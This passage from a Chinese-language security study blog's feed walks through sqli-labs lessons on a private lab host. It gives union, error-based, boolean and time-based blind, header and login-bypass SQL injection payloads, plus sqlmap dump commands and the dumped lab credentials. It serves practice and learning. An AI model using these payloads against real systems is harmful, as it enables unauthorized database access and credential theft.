information_schema.columns where table_name='users' and table_schema=database()),0x7e),1)--+</code></p><blockquote><p>XPATH syntax error: ‘<del>id,username,password</del>‘</p></blockquote><p><a name="dltOi"></a></p><h2 id="查看字段内容"><a href="#查看字段内容" class="headerlink" title="查看字段内容"></a>查看字段内容</h2><p><code>?id=1" or updatexml(1,concat(0x7e,(select group_concat(concat(username,' ^ ',password)) from users),0x7e),1)--+</code></p><blockquote><p>XPATH syntax error: ‘~Dumb ^ Dumb,Angelina ^ I-kill-y’</p></blockquote><p>substring(1,2,3)<br><code>?id=1" or updatexml(1,concat(0x7e,substring((select group_concat(concat(username,' ^ ',password)) from users),32,31),0x7e),1)--+</code></p><blockquote><p>XPATH syntax error: ‘~ou,Dummy ^ p@ssword,secure ^ cr’</p></blockquote><p>……</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less4</title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/basic-challenges/lees1/less4/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/basic-challenges/lees1/less4/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token string">'"'</span> <span class="token builtin class-name">.</span> <span class="token variable">$id</span> <span class="token builtin class-name">.</span> <span class="token string">'"'</span><span class="token punctuation">;</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM users WHERE id=(<span class="token variable">$id</span>) LIMIT 0,1"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>加双引号和括号。</p><p><code>?id=1"</code>报错</p><blockquote><p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘order by 4– “) LIMIT 0,1’ at line 1</p></blockquote><p>用”)闭合<br><code>?id=1") order by 4--+</code>报错<br><code>?id=1") order by 3--+</code>不报错,3列</p><p><code>?id=-1") union select 1,2,3 --+回显点2,3</code></p><p><code>?id=-1") union select 1,2,group_concat(schema_name) from information_schema.schemata --+</code></p><p><code>?id=-1")union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+</code></p><p><code>?id=-1")union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'--+</code></p><p><code>?id=-1") union select 1,2,(select group_concat(username,password) from users)--+</code></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less3</title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/basic-challenges/lees1/less3/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/basic-challenges/lees1/less3/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM users WHERE id=('<span class="token variable">$id</span>') LIMIT 0,1"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>参数加了括号和单引号。</p><p><code>?id=1'</code>报错，有注入点。</p><blockquote><p>+号在浏览器中空格<br>#号的ascll码是%23</p></blockquote><p><code>?id=1') order by 4 --+</code>报错，没有第4列<br><code>?id=1') order by 3 --+</code>显示正常，有3列</p><p><code>?id=-1') union select 1,2,3 --+</code>显示2，3是回显点。</p><p><code>?id=-1') union select 1,2,group_concat(schema_name) from information_schema.schemata --+</code></p><p><code>?id=-1') union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+</code></p><p><code>?id=-1') union select 1,2,group_concat(column_name) from information_schema.columns  where table_name ='users'--+</code></p><p><code>?id=-1') union select 1,2,(select group_concat(username,0x7e,password) from users)--+</code></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less2</title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/basic-challenges/lees1/less2/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/basic-challenges/lees1/less2/</url>
      
        <content type="html"><![CDATA[<p><a name="YstTA"></a></p><h1 id="查看源码"><a href="#查看源码" class="headerlink" title="查看源码"></a>查看源码</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM users WHERE id=<span class="token variable">$id</span> LIMIT 0,1"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看源码，参数没有闭合，说明为数字型注入。</p><p><a name="t0fo6"></a></p><h1 id="找注入点"><a href="#找注入点" class="headerlink" title="找注入点"></a>找注入点</h1><blockquote><p><a href="http://192.168.31.193/Less-2/">http://192.168.31.193/Less-2/</a></p></blockquote><p>Please input the ID as parameter with numeric value&amp;#x20;<br>请输入ID作为带数值的参数<br><code>?id=1 and 1=2 #</code><br>1=2非真，页面就没有显示内容，说明数据被执行了。 <a name="FFdxf"></a></p><h1 id="判断字段"><a href="#判断字段" class="headerlink" title="判断字段"></a>判断字段</h1><p><code>?id=1 order by 4#</code><br>Unknown column ‘4’ in ‘order clause’<br>“order子句”中的未知列“4”<br><code>?id=1 order by 3#</code><br>显示正常，说明有三列。 <a name="VgMOQ"></a></p><h1 id="找回显点"><a href="#找回显点" class="headerlink" title="找回显点"></a>找回显点</h1><p><code>?id=-1 union select 1,2,3#</code><br>显示了2，3，说明2，3是回显点</p><p><a name="RnFWy"></a></p><h1 id="开始注入"><a href="#开始注入" class="headerlink" title="开始注入"></a>开始注入</h1><p><a name="NpH7F"></a></p><h2 id="查看数据库名"><a href="#查看数据库名" class="headerlink" title="查看数据库名"></a>查看数据库名</h2><p><code>?id=-1 union select 1,2,group_concat(schema_name) from informaion_schema.schemata #</code></p><blockquote><p>schema的复数:schemata</p></blockquote><p>显示了数据库名称：<br>information_schema,<br>challenges,<br>dvwa_com,<br>mysql,<br>performance_schema,<br>security,<br>sql,<br>sys <a name="oQxjF"></a></p><h2 id="查看数据表名称"><a href="#查看数据表名称" class="headerlink" title="查看数据表名称"></a>查看数据表名称</h2><p><code>?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#</code></p><blockquote><p>where table_schema=database()：查到本数据库的所有表名</p></blockquote><p>显示数据表名称：<br>emails,<br>referers,<br>uagents,<br>users<br>查看users表字段名称<br><code>?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'#</code><br>显示字段名：<br>user_id,<br>first_name,<br>last_name,<br>user,<br>password,<br>avatar,<br>last_login,<br>failed_login,<br>USER,<br>CURRENT_CONNECTIONS,<br>TOTAL_CONNECTIONS,<br>id,<br>username,<br>password <a name="GOQCD"></a></p><h2 id="查看字段内容"><a href="#查看字段内容" class="headerlink" title="查看字段内容"></a>查看字段内容</h2><p><code>?id=-1 union select 1,2,(select group_concat(username,0x7e,password) from users)#</code><br>用户名<del>密码<br>Dumb</del>Dumb,<br>Angelina<del>I kill-you,<br>Dummy</del>p@ssword,<br>secure<del>crappy,<br>stupid</del>stupidity,<br>superman<del>genious,<br>batman</del>mob!le,<br>admin<del>admin,<br>admin1</del>admin1,<br>admin2<del>admin2,<br>admin3</del>admin3,<br>dhakkan<del>dumbo,<br>admin4</del>admin4</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less9</title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/basic-challenges/less9/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/basic-challenges/less9/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM users WHERE id='<span class="token variable">$id</span>' LIMIT 0,1"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>?id=1</code>显示You are in………..<br><code>id=1'</code>也显示You are in………..<br>&amp;#x20;尝试了N种闭合方式之后发现页面的<strong>回显都是一样的</strong>并且<strong>没有任何报错信息</strong>，<br>通过源码找到字符型闭合 ’<br>浅试一下<strong>时间盲注</strong>\ <a name="V17MH"></a></p><h1 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h1><p><a name="kObnI"></a></p><h2 id="猜解数据库名称"><a href="#猜解数据库名称" class="headerlink" title="猜解数据库名称"></a>猜解数据库名称</h2><blockquote><p><strong>if(1,sleep(5),0)</strong><br>if()函数中，</p><ul><li>x为布尔盲注中的长度、字符猜测语句，如：length(database())=1</li><li>sleep()函数，a为时间间隔，如果前面的语句x为真，则在页面出来前间隔a秒；</li><li>0：占位</li></ul></blockquote><p><code>?id=-1' or if(ascii(mid(database(),1,1))&lt;=135,sleep(5),0)--+</code> 延时五秒了 <a name="kSZVm"></a></p><h2 id="猜解数据表名称"><a href="#猜解数据表名称" class="headerlink" title="猜解数据表名称"></a>猜解数据表名称</h2><p><code>?id=-1' or if(mid((select group_concat(table_name) from information_schema.tables where table_schema=database(),1,1)='e'),sleep(5),0)--+</code> <a name="j47RV"></a></p><h2 id="猜解字段名称"><a href="#猜解字段名称" class="headerlink" title="猜解字段名称"></a>猜解字段名称</h2><p><code>?id=-1' or if(mid((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),1,1)='e',sleep(5),0)--+</code> <a name="aRdmK"></a></p><h2 id="猜解字段内容"><a href="#猜解字段内容" class="headerlink" title="猜解字段内容"></a>猜解字段内容</h2><p><code>?id=-1' or if(mid((select group_concat(username,0x7e,password) from users),1,1)='D',sleep(5),0)--+</code></p><p><a name="REjRI"></a></p><h1 id="用python跑时间盲注"><a href="#用python跑时间盲注" class="headerlink" title="用python跑时间盲注"></a>用python跑时间盲注</h1><p><a href="https://www.yuque.com/attachments/yuque/0/2022/py/29430497/1668822268338-e637faec-85f6-486f-aebb-01a572063c08.py?_lake_card=%7B%22src%22:%22https://www.yuque.com/attachments/yuque/0/2022/py/29430497/1668822268338-e637faec-85f6-486f-aebb-01a572063c08.py%22,%22name%22:%22time-blind.py%22,%22size%22:3708,%22type%22:%22text/x-python%22,%22ext%22:%22py%22,%22source%22:%22%22,%22status%22:%22done%22,%22mode%22:%22title%22,%22download%22:true,%22taskId%22:%22uae8e72ad-3444-4889-b4c9-55bfc76ab54%22,%22taskType%22:%22upload%22,%22__spacing%22:%22both%22,%22id%22:%22u943232bd%22,%22margin%22:%7B%22top%22:true,%22bottom%22:true%7D,%22card%22:%22file%22%7D">time-blind.py</a></p><blockquote><p>url = “<a href="http://192.168.31.193/Less-10/?id=1">http://192.168.31.193/Less-10/?id=1</a>‘“</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿guoyx<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/home/kali/sql-python<span class="token punctuation">]</span>└─<span class="token comment"># python3 time-blind.py  </span>数据库名为-<span class="token operator">&gt;</span>s数据库名为-<span class="token operator">&gt;</span>se数据库名为-<span class="token operator">&gt;</span>sec数据库名为-<span class="token operator">&gt;</span>secu数据库名为-<span class="token operator">&gt;</span>secur数据库名为-<span class="token operator">&gt;</span>secur数据库名为-<span class="token operator">&gt;</span>secur数据库名为-<span class="token operator">&gt;</span>secury第一个表为-<span class="token operator">&gt;</span>e第一个表为-<span class="token operator">&gt;</span>em第一个表为-<span class="token operator">&gt;</span>ema第一个表为-<span class="token operator">&gt;</span>emai第二个表为-<span class="token operator">&gt;</span>r第二个表为-<span class="token operator">&gt;</span>re第二个表为-<span class="token operator">&gt;</span>ref第二个表为-<span class="token operator">&gt;</span>refr第三个表为-<span class="token operator">&gt;</span>u<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a name="FUnXU"></a></p><h1 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿guoyx<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>└─<span class="token comment"># sqlmap -u 192.168.31.193/Less-9/?id=1 --batch -D "security" -T "users" --dump</span>Database: securityTable: <span class="token function">users</span><span class="token punctuation">[</span><span class="token number">13</span> entries<span class="token punctuation">]</span>+----+------------+----------+<span class="token operator">|</span> <span class="token function">id</span> <span class="token operator">|</span> password   <span class="token operator">|</span> username <span class="token operator">|</span>+----+------------+----------+<span class="token operator">|</span> <span class="token number">1</span>  <span class="token operator">|</span> Dumb       <span class="token operator">|</span> Dumb     <span class="token operator">|</span><span class="token operator">|</span> <span class="token number">2</span>  <span class="token operator">|</span> I-kill-you <span class="token operator">|</span> Angelina <span class="token operator">|</span><span class="token operator">|</span> <span class="token number">3</span>  <span class="token operator">|</span> p@ssword   <span class="token operator">|</span> Dummy    <span class="token operator">|</span><span class="token operator">|</span> <span class="token number">4</span>  <span class="token operator">|</span> crappy     <span class="token operator">|</span> secure   <span class="token operator">|</span><span class="token operator">|</span> <span class="token number">5</span>  <span class="token operator">|</span> stupidity  <span class="token operator">|</span> stupid   <span class="token operator">|</span><span class="token operator">|</span> <span class="token number">6</span>  <span class="token operator">|</span> genious    <span class="token operator">|</span> superman <span class="token operator">|</span><span class="token operator">|</span> <span class="token number">7</span>  <span class="token operator">|</span> mob<span class="token operator">!</span>le     <span class="token operator">|</span> batman   <span class="token operator">|</span><span class="token operator">|</span> <span class="token number">8</span>  <span class="token operator">|</span> admin      <span class="token operator">|</span> admin    <span class="token operator">|</span><span class="token operator">|</span> <span class="token number">9</span>  <span class="token operator">|</span> admin1     <span class="token operator">|</span> admin1   <span class="token operator">|</span><span class="token operator">|</span> <span class="token number">10</span> <span class="token operator">|</span> admin2     <span class="token operator">|</span> admin2   <span class="token operator">|</span><span class="token operator">|</span> <span class="token number">11</span> <span class="token operator">|</span> admin3     <span class="token operator">|</span> admin3   <span class="token operator">|</span><span class="token operator">|</span> <span class="token number">12</span> <span class="token operator">|</span> dumbo      <span class="token operator">|</span> dhakkan  <span class="token operator">|</span><span class="token operator">|</span> <span class="token number">14</span> <span class="token operator">|</span> admin4     <span class="token operator">|</span> admin4   <span class="token operator">|</span>+----+------------+----------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less18</title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/basic-challenges/less18/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/basic-challenges/less18/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT  users.username, users.password FROM users WHERE users.username=<span class="token variable">$uname</span> and users.password=<span class="token variable">$passwd</span> ORDER BY users.id DESC LIMIT 0,1"</span><span class="token punctuation">;</span><span class="token variable">$result1</span> <span class="token operator">=</span> mysql_query<span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$row1</span> <span class="token operator">=</span> mysql_fetch_array<span class="token punctuation">(</span><span class="token variable">$result1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>if<span class="token punctuation">(</span><span class="token variable">$row1</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token builtin class-name">echo</span> <span class="token string">'&lt;font color= "#FFFF00" font size = 3 &gt;'</span><span class="token punctuation">;</span><span class="token variable">$insert</span><span class="token operator">=</span><span class="token string">"INSERT INTO <span class="token variable"><span class="token variable">`</span>security<span class="token variable">`</span></span>.<span class="token variable"><span class="token variable">`</span>uagents<span class="token variable">`</span></span> (<span class="token variable"><span class="token variable">`</span>uagent<span class="token variable">`</span></span>, <span class="token variable"><span class="token variable">`</span>ip_address<span class="token variable">`</span></span>, <span class="token variable"><span class="token variable">`</span>username<span class="token variable">`</span></span>) VALUES ('<span class="token variable">$uagent</span>', '<span class="token variable">$IP</span>', <span class="token variable">$uname</span>)"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>源码这里当用户名跟密码都有输入的时候才能触发的，可以看到用户名和密码都被过筛了，也就是不能在这里进行SQL注入了</p><blockquote><p><strong>Your IP ADDRESS is: 192.168.31.119</strong></p></blockquote><p>网页记录了本地ip的信息，说明可能事数据库记录了本机的信息，<br>即后台获取了一些诸如Ip的信息保存 到数据库中，<br>并且页面返回了数据包<strong>user-agent</strong>的信息，<br>那么在请求头中就可能存在注入点\ <a name="hHPE1"></a></p><h1 id="请求头注入"><a href="#请求头注入" class="headerlink" title="请求头注入"></a>请求头注入</h1><blockquote><p>源代码标识获取浏览器信息，即user-Agent部分，<br>表示客户端通过什么浏览器向后台请求<br>在后面的请求中也有将该部分进行存储添加到数据库，<br>现在就可以通过一些手段在数据添加的同时进行注入</p></blockquote><p><a name="Y51fI"></a></p><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p><a name="JHCAA"></a></p><h3 id="爆破数据库名称"><a href="#爆破数据库名称" class="headerlink" title="爆破数据库名称"></a>爆破数据库名称</h3><p>1’,1,updatexml(1,concat(0x7e,database(),0x7e),1))#<br>不能像常规的报错盲注一样直接上，我们得考虑一下闭合VALUES，假如我们利用的点是$uagent，那构建格式就应该是1’,1,1)#，在SQL语句中相当于</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">INSERT INTO <span class="token variable"><span class="token variable">`</span>security<span class="token variable">`</span></span><span class="token builtin class-name">.</span><span class="token variable"><span class="token variable">`</span>uagents<span class="token variable">`</span></span> <span class="token punctuation">(</span><span class="token variable"><span class="token variable">`</span>uagent<span class="token variable">`</span></span>, <span class="token variable"><span class="token variable">`</span>ip_address<span class="token variable">`</span></span>, <span class="token variable"><span class="token variable">`</span>username<span class="token variable">`</span></span><span class="token punctuation">)</span> VALUES <span class="token punctuation">(</span><span class="token string">'1'</span>,1,1<span class="token punctuation">)</span><span class="token comment">#, '$IP', $uname)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>Your IP ADDRESS is: 192.168.31.119<br>Your User Agent is: 1’,1,updatexml(1,concat(0x7e,database(),0x7e),1))#<br>XPATH syntax error: ‘<del>security</del>‘</p></blockquote><p><a name="I1uZq"></a></p><h3 id="爆破数据表"><a href="#爆破数据表" class="headerlink" title="爆破数据表"></a>爆破数据表</h3><p><code>1',1,updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema = database()),0x7e),1))#</code> <a name="tlVTR"></a></p><h3 id="爆破字段名"><a href="#爆破字段名" class="headerlink" title="爆破字段名"></a>爆破字段名</h3><p><code>1',1, updatexml(1,concat(0x7e,(select (column_name) from information_schema.columns where table_name='users' limit 8,1),0x7e),1)) -- +</code> <a name="MrWWa"></a></p><h3 id="爆破字段"><a href="#爆破字段" class="headerlink" title="爆破字段"></a>爆破字段</h3><p><code>1',1, updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),1)) -- +</code> <a name="uA05n"></a></p><h1 id="sqlmap进行头部注入"><a href="#sqlmap进行头部注入" class="headerlink" title="sqlmap进行头部注入"></a>sqlmap进行头部注入</h1><blockquote><p>在头部注入爆破中，sqlmap需要提高扫描等级 level和risk<br>level x(x为1-5)<br>2时会对头部的<strong>cookie</strong>进行扫描注入尝试，<br>x&gt;=3时对<strong>user-Agent</strong>,<strong>ip</strong>,<strong>referer</strong> 参数进行扫描</p><p>risk x(x 1-3)<br>1时进行大部分扫描<br>2会增加基于事件的测试语句<br>3会增加or语句的sql注入</p></blockquote><p><a name="pqNBo"></a></p><h1 id="检测注入点"><a href="#检测注入点" class="headerlink" title="检测注入点"></a>检测注入点</h1><p><code>sqlmap -u "http://192.168.31.193/Less-18/ " --data="passwd=admin&amp;uname=admin" --batch --level 3 </code> <a name="t2ABA"></a></p><h1 id="爆破数据库名"><a href="#爆破数据库名" class="headerlink" title="爆破数据库名"></a>爆破数据库名</h1><p><code>sqlmap -u "http://192.168.31.193/Less-18/ " --data="passwd=admin&amp;uname=admin" --batch --level 3 --current-db</code> <a name="bdXmy"></a></p><h1 id="爆破数据表名"><a href="#爆破数据表名" class="headerlink" title="爆破数据表名"></a>爆破数据表名</h1><p><code>sqlmap -u "http://192.168.31.193/Less-18/ " --data="passwd=admin&amp;uname=admin" --batch --level 3 -D "security" --tables</code> <a name="Dm6EO"></a></p><h1 id="爆破字段内容"><a href="#爆破字段内容" class="headerlink" title="爆破字段内容"></a>爆破字段内容</h1><p><code>sqlmap -u "http://192.168.31.193/Less-18/ " --data="passwd=admin&amp;uname=admin" --batch --level 3 -D "security" -T "users" --dump</code></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less15</title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/basic-challenges/less15/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/basic-challenges/less15/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">@<span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT username, password FROM users WHERE username='<span class="token variable">$uname</span>' and password='<span class="token variable">$passwd</span>' LIMIT 0,1"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>用单引号’闭合<br><code>1'</code>显示红色的图片<br><code>admin' order by 2-- +</code>显示蓝色图片</p><p><code>admin' union select 1,2-- +</code>蓝色图片</p><p>正确的数据与错误数据页面回显的图片不一样，使用<strong>布尔盲注</strong>\ <a name="K8btv"></a></p><h1 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">判断数据库名称长度admin<span class="token string">' or length(database())=8--+显示蓝色图片，说明数据库长度为8逐一猜解数据库名称admin'</span> or ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span>,1,1<span class="token punctuation">))</span><span class="token operator">=</span><span class="token number">115</span>--+第一个字符是s  <span class="token punctuation">..</span>.猜解数据表名称admin<span class="token string">' or ascii(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))&gt;101 --+第一个字符是e ...猜解字段名称admin'</span> or ascii<span class="token punctuation">(</span>mid<span class="token variable"><span class="token punctuation">((</span>select group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> from information_schema.columns where table_schema<span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span> and table_name<span class="token operator">=</span>'users'<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">))</span></span><span class="token operator">=</span><span class="token number">105</span>--+第一个字符是i <span class="token punctuation">..</span>.猜解字段内容admin' or ascii<span class="token punctuation">(</span>mid<span class="token variable"><span class="token punctuation">((</span>select group_concat<span class="token punctuation">(</span>username<span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">,</span>password<span class="token punctuation">)</span> from users<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">))</span></span><span class="token operator">=</span><span class="token number">68</span>--+第一个字符是D <span class="token punctuation">..</span>.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a name="ytLRo"></a></p><h1 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">探测注入点sqlmap <span class="token parameter variable">-u</span> http://192.168.31.193/Less-15/ <span class="token parameter variable">--data</span><span class="token operator">=</span><span class="token string">"uname=admin&amp;passwd=admin"</span> <span class="token parameter variable">--batch</span>爆破数据库名sqlmap <span class="token parameter variable">-u</span> http://192.168.31.193/Less-15/ <span class="token parameter variable">--data</span><span class="token operator">=</span><span class="token string">"uname=admin&amp;passwd=admin"</span> <span class="token parameter variable">--batch</span> --current-db爆破数据表sqlmap <span class="token parameter variable">-u</span> http://192.168.31.193/Less-15/ <span class="token parameter variable">--data</span><span class="token operator">=</span><span class="token string">"uname=admin&amp;passwd=admin"</span> <span class="token parameter variable">--batch</span> <span class="token parameter variable">-D</span> security <span class="token parameter variable">--tables</span> 最后脱库sqlmap <span class="token parameter variable">-u</span> http://192.168.31.193/Less-15/ <span class="token parameter variable">--data</span><span class="token operator">=</span><span class="token string">"uname=admin&amp;passwd=admin"</span> <span class="token parameter variable">--batch</span> <span class="token parameter variable">-D</span> security <span class="token parameter variable">-T</span> <span class="token function">users</span> <span class="token parameter variable">--dump</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less11</title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/basic-challenges/less11/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/basic-challenges/less11/</url>
      
        <content type="html"><![CDATA[<p><img src="../../assets/ivhbtp8cseozy69t/1668574343567-9abdcb38-18af-4797-98c2-2073d26d484d.png" alt="image.png"><br>发现是一个登录页面<br><code>1'</code>单引号闭合<br>使用万能密码。<br>username输入<code>admin' or 1-- +</code>成功登录. <a name="VnzYl"></a></p><h1 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h1><p><a name="tFdi3"></a></p><h2 id="查询字段数"><a href="#查询字段数" class="headerlink" title="查询字段数"></a>查询字段数</h2><p><code>1' order by 3-- +</code></p><blockquote><p>登录后页面报错Unknown column ‘3’ in ‘order clause’</p></blockquote><p><code>1' order by 2-- +</code><br>没有提示错误，说明有2个字段；</p><p><a name="CeMCs"></a></p><h2 id="判断回显点"><a href="#判断回显点" class="headerlink" title="判断回显点"></a>判断回显点</h2><p><code>1' union select 1,2 #</code><br>显示1，2。判断出页面有两个显示位；</p><p><a name="ECWHT"></a></p><h2 id="爆数据库名"><a href="#爆数据库名" class="headerlink" title="爆数据库名"></a>爆数据库名</h2><p><code>1' union select 1,group_concat(schema_name) from information_schema.schemata #</code></p><blockquote><p>Your Login name:1<br>Your Password:information_schema,challenges,dvwa_com,mysql,performance_schema,security,sql,sys</p></blockquote><p><a name="FvGKE"></a></p><h2 id="爆数据表名"><a href="#爆数据表名" class="headerlink" title="爆数据表名"></a>爆数据表名</h2><p><code>1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #</code></p><blockquote><p>Your Login name:1<br>Your Password:emails,referers,uagents,users</p></blockquote><p><a name="cr7p8"></a></p><h2 id="爆字段名"><a href="#爆字段名" class="headerlink" title="爆字段名"></a>爆字段名</h2><p><code>1' union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users' #</code></p><blockquote><p>Your Login name:1<br>Your Password:id,username,password</p></blockquote><p><a name="yyein"></a></p><h2 id="爆字段内容"><a href="#爆字段内容" class="headerlink" title="爆字段内容"></a>爆字段内容</h2><p><code>1' union select 1,(select group_concat(username,'^',password)from users) #</code></p><blockquote><p>Your Login name:1<br>Your Password:Dumb^Dumb,<br>Angelina^I-kill-you,<br>Dummy^p@ssword,<br>secure^crappy,<br>stupid^stupidity,<br>superman^genious,<br>batman^mob!le,<br>admin^admin,<br>admin1^admin1,<br>admin2^admin2,<br>admin3^admin3,<br>dhakkan^dumbo,<br>admin4^admin4</p></blockquote><p><a name="wCZkA"></a></p><h1 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">启动sqlmap探测注入点sqlmap <span class="token parameter variable">-u</span> <span class="token function">ip</span> <span class="token parameter variable">--data</span><span class="token operator">=</span><span class="token string">"uname=admin&amp;passwd=admin"</span> <span class="token parameter variable">--batch</span>爆破当前数据库名sqlmap <span class="token parameter variable">-u</span> <span class="token function">ip</span> <span class="token parameter variable">--data</span><span class="token operator">=</span><span class="token 